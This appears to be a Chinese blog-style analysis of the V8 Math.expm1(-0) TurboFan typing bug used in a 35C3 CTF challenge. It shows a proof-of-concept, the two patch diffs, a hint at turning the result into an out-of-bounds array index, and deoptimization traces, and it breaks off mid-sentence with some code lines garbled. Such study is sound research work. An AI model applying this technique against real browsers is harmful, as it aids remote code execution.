## 前言：
分析了一下`Math.expm1(-0)`的`OOB`的洞，发现小到可能觉得只是个功能特性问题，并不是一个`bug`的漏洞，也能够通过一些极其巧妙的方法来达到一个意想不到的漏洞利用。
## 正文：
相关`issue`在这里：
  1. 
  2. 
关键的在这里：
    function foo() {
      return Object.is(Math.expm1(-0), -0);
    }
    console.log(foo());
    %OptimizeFunctionOnNextCall(foo);
    console.log(foo());
    $ ./d8 --allow-natives-syntax expm1-poc.js
    true
    false
可能乍一看，也就是一个特性问题，正不正确的其实也没多大关系..漏洞发现者开始也是这么觉得的..但是后来他才发现这个漏洞是完全可利用的`RCE`。该漏洞修复了两次，第一次官方只`patch`了一个文件`operation-typer.cc`，后面又`patch`了`typer.cc`文件。`patch`记录可以参考如下：
  1. 
  2. 
这里就拿`35C3`上的题来说，作者拿了他发现的这个洞去出了题，出的是只打了`operation-typer.cc`没有打`typer.cc`的题。现在我们直接来分析一下，先看看两个`patch`：
`operation-typer.cc`：
    Type OperationTyper::NumberExpm1(Type type) {
       DCHECK(type.Is(Type::Number()));
    -  return Type::Union(Type::PlainNumber(), Type::NaN(), zone());
    +  return Type::Number();
     }
     Type OperationTyper::NumberFloor(Type type) {
`typer.cc`：
    @@ -1433,7 +1433,6 @@
         // Unary math functions.
         case BuiltinFunctionId::kMathAbs:
         case BuiltinFunctionId::kMathExp:
    -    case BuiltinFunctionId::kMathExpm1:
           return Type::Union(Type::PlainNumber(), Type::NaN(), t->zone());
         case BuiltinFunctionId::kMathAcos:
         case BuiltinFunctionId::kMathAcosh:
    @@ -1443,6 +1442,7 @@
         case BuiltinFunctionId::kMathAtanh:
         case BuiltinFunctionId::kMathCbrt:
         case BuiltinFunctionId::kMathCos:
    +    case BuiltinFunctionId::kMathExpm1:
         case BuiltinFunctionId::kMathFround:
         case BuiltinFunctionId::kMathLog:
         case BuiltinFunctionId::kMathLog1p:
需要说明的是这时候的`CheckBounds`检查还是可以消除的。
从`patch`来看修改了`MathExpm1`的`type`类型，本来是`PlainNumber加NaN`类型的，现在修改成了`Number`类型。`PlainNumber`类型表示除-0之外的任何浮点数，但是这是在`TurboFan`当中的，实际不优化过程是被当作浮点数的，浮点数是包括`-0`的。所以这就产生了错误。
当我们直接运行`Poc`的话，仍然会得到一样的结果，我们先看看IR显示结果：
    function test(x){
        var b = Object.is(Math.expm1(x),-0);
        return b;         //a[b * 4];
    }
    print(test(-0));
    for (var i = 0; i  (opt #0) @0, FP to SP delta: 24, caller sp: 0x7ffe301a06c0]
                ;;; deoptimize at , not a Number or Oddball
      reading FeedbackVector (slot 8)
      reading input frame test => bytecode_offset=0, args=2, height=6, retval=0(#0); inputs:
          0: 0x1bddfbb9df21 ;  [fp -  16]  0x1bddfbb9df21 
          1: 0x234d92701521 ;  [fp +  24]  0x234d92701521 
          2: 0x28603cd042c9 ; rax 0x28603cd042c9 
          3: 0x1bddfbb81749 ;  [fp -  24]  0x1bddfbb81749 
          4: 0x28603cd00e19 ; (literal  3) 0x28603cd00e19 
          5: 0x28603cd00e19 ; (literal  3) 0x28603cd00e19 
          6: 0x28603cd00e19 ; (literal  3) 0x28603cd00e19 
          7: 0x28603cd00e19 ; (literal  3) 0x28603cd00e19 
          8: 0x28603cd00e19 ; (literal  3) 0x28603cd00e19 
          9: 0x28603cd00e19 ; (literal  3) 0x28603cd00e19 
      translating interpreted frame test => bytecode_offset=0, height=48
        0x7ffe301a06b8: [top + 104]  ;  stack parameter (input #1)
        0x7ffe301a06b0: [top +  96]  ;  stack parameter (input #2)
        -------------------------        0x7ffe301a06a8: [top +  88]  ;  context (input #3)
        0x7ffe301a0690: [top +  64]  ;  function (input #0)
        0x7ffe301a0688: [top +  56]  ;  bytecode array
        0x7ffe301a0680: [top +  48]  ;  bytecode offset
        -------------------------        0x7ffe301a0678: [top +  40]  ;  stack parameter (input #4)
        0x7ffe301a0670: [top +  32]  ;  stack parameter (input #5)
        0x7ffe301a0668: [top +  24]  ;  stack parameter (input #6)
        0x7ffe301a0660: [top +  16]  ;  stack parameter (input #7)
        0x7ffe301a0658: [top +   8]  ;  stack parameter (input #8)
        0x7ffe301a0650: [top +   0]  ;  accumulator (input #9)
    [deoptimizing (eager): end 0x1bddfbb9df21  @0 => node=0, pc=0x563b969772c0, caller sp=0x7ffe301a06c0, took 0.129 ms]
    Feedback updated from deoptimization at , not a Number or Oddball
可以看见一些`not a Number or